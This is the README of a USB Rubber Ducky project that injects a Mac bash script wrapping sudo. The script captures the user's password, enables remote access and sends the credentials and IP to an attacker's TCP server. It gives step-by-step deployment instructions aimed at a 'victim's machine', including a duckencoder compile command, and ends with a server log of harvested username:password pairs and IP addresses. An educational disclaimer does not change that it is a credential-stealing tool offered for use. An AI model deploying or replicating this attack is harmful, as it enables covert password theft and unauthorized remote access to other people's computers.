# ducky-password-grabber

Small ducky script for the [Rubber ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe). The rubber ducky acts as keyboard and can inject code into the victim's computer. In this example, it creates a bash script that makes a wrapper around the `sudo` command, captures the password the next time the user uses `sudo`. When the password is entered, it enables remote access and sends the password along the username and IP to a determined TCP server. If on the same network, the atacker could potentially access the victim's machine.

This script **works only** in a Mac with the US keyboard layout.

This script was made for educational purposes. **DON'T BE EVIL**

## How to use

The code in `sudo_wrapper.sh` is the code that gets injected. The same exact code is present in the ducky script `password_grabber.ducky`. If you make any changes, make sure the ducky is updated.

1. Run the `server.sh`
2. Set your server address on both `sudo_wrapper.sh` and `password_grabber.ducky`
3. Download the [duckencoder](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads)
4. Insert the SD card
5. Compile the ducky script `java -jar duckencoder.jar -i password_grabber.ducky -o /Volumes/SD_CARD_NAME/inject.bin`
6. Connect the rubber ducky on your victim's machine 😈
7. Wait for them to use `sudo`
8. See the output in the file `passwd.txt` on the server side.

### Server output sample

```
Mon Feb 19 16:57:25 CST 2018 student:batman@10.43.94.118 -> valid
Mon Feb 19 16:57:59 CST 2018 student:batmanasdasd@10.43.94.118 -> invalid
Mon Feb 19 16:58:22 CST 2018 student:batman@10.43.94.118 -> valid
Mon Feb 19 17:04:22 CST 2018 miguelcabral:hello@10.43.50.113 -> invalid
Sat Mar  3 14:52:29 CST 2018 toledo:lqiwfiuqwnqwf@192.168.0.8 -> invalid
Sat Mar  3 14:53:02 CST 2018 toledo:eddyhola@192.168.0.8 -> invalid
Sat Mar  3 14:53:15 CST 2018 toledo:hellow@192.168.0.8 -> valid
```